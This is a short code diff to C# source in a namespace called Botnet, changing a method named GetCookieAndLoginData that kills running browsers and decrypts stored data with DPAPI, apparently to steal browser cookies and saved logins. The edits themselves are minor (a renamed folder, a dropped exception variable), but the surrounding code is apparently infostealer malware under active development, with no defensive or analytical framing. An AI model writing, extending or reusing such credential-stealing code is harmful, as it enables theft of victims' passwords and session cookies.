@@ -51,7 +51,7 @@ namespace Botnet
 
         public void GetCookieAndLoginData()
         {
-            string directory = config.appData + "\\Bot";
+            string directory = config.appData + "\\BotFiles";
             Directory.CreateDirectory(directory);
             misc.KillBrowsers();
             string username = Environment.UserName;
@@ -292,7 +292,7 @@ namespace Botnet
                                 {
                                     decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                                 }
-                                catch (Exception ex)
+                                catch (Exception)
                                 {
                                     continue;
                                 }
